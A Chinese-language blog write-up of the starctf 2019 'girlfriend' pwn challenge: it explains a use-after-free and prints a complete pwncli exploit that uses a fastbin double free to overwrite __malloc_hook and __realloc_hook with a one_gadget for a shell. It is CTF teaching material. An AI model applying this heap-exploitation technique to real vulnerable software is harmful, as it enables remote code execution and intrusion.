# starctf_2019_girlfriend



### 总结

常规的`fastbin attack`，劫持`__malloc_hook`为`realloc+2`，然后`__realloc_hook`为`one_gadget`即可

<!-- more -->

### 题目分析

#### checksec

![image-20210815165047553](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815165047553.png)

题目环境为`ubuntu-16.04`

#### 函数分析

恢复下`girlfriend`的结构体：

```c
struct Girl
{
  char *name_ptr;
  _DWORD size;
  char phone[12];
};
```

漏洞点在`call_girlfriend`的时候的`UAF`:

![image-20210815165332825](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815165332825.png)

### exp

```python
from pwncli import *

cli_script()

p = gift['io']
elf = gift['elf']
if gift['debug']:
    gadget = 0xf1207
    libc = gift['libc']
else:
    gadget = 0xf1147
    libc = ELF("./libc-2.23.so")


def add(size, name="a",phone="b"):
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name)
    p.sendafter("please input her call:\n", phone)


def show(idx):
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline()
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone


def call(idx):
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx))


# fastbin attack
# leak libc addr to get malloc addr
# use one_gadget to get shell

add(0x80)
add(0x60)
add(0x60)

call(0)
name, _= show(0)
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))
log_address("leak_libc_addr", leak_libc_addr)
libc_base_addr = leak_libc_addr - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

call(1)
call(2)
call(1)

add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))
add(0x60)
add(0x60)

# 0x45226 0x4527a 0xf0364 0xf1207

payload = flat(["a" * 11, libc_base_addr + gadget, libc.sym['realloc']+2])

add(0x60, payload)

p.sendlineafter("Input your choice:", "1")

p.interactive()
```

![image-20210815165431812](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815165431812.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-15-starctf-2019-girlfriend/  

